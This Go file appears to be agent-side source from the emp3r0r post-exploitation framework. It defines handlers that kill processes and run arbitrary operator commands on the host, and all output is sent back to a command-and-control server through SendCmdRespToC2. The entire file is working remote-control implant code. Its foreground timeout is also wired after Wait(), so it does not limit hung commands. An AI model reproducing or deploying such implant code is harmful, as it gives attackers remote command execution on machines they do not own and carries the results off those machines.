package agent

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// killCmdRun kills the specified process.
func killCmdRun(cmd *cobra.Command, args []string) {
	pid, _ := cmd.Flags().GetInt("pid")
	if pid == 0 {
		SendCmdRespToC2("error: no pid specified", cmd, args)
		return
	}
	proc, err := os.FindProcess(pid)
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to find process %d: %v", pid, err), cmd, args)
		return
	}
	if err = proc.Kill(); err != nil {
		SendCmdRespToC2(fmt.Sprintf("Failed to kill process %d: %v", pid, err), cmd, args)
		return
	}
	SendCmdRespToC2(fmt.Sprintf("Process %d killed", pid), cmd, args)
}

// execCmdRun executes a command and returns its output.
func execCmdRun(cmd *cobra.Command, args []string) {
	cmdStr, _ := cmd.Flags().GetString("cmd")
	if cmdStr == "" {
		SendCmdRespToC2("exec: empty command", cmd, args)
		return
	}
	parsed := util.ParseCmd(cmdStr)
	if runtime.GOOS == "windows" && !strings.HasSuffix(parsed[0], ".exe") {
		parsed[0] += ".exe"
	}
	execCmd := exec.Command(parsed[0], parsed[1:]...)
	var outBuf bytes.Buffer
	execCmd.Stdout = &outBuf
	execCmd.Stderr = &outBuf
	err := execCmd.Start()
	if err != nil {
		SendCmdRespToC2(fmt.Sprintf("exec failed: %v", err), cmd, args)
		return
	}
	// If not running in background, wait with a timeout.
	keepRunning, _ := cmd.Flags().GetBool("bg")
	if !keepRunning {
		execCmd.Wait()
		go func() {
			// kill after 10 seconds if still alive
			time.Sleep(10 * time.Second)
			if util.IsPIDAlive(execCmd.Process.Pid) {
				_ = execCmd.Process.Kill()
			}
		}()
	} else {
		SendCmdRespToC2(fmt.Sprintf("Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid), cmd, args)
		return
	}
	SendCmdRespToC2(outBuf.String(), cmd, args)
}
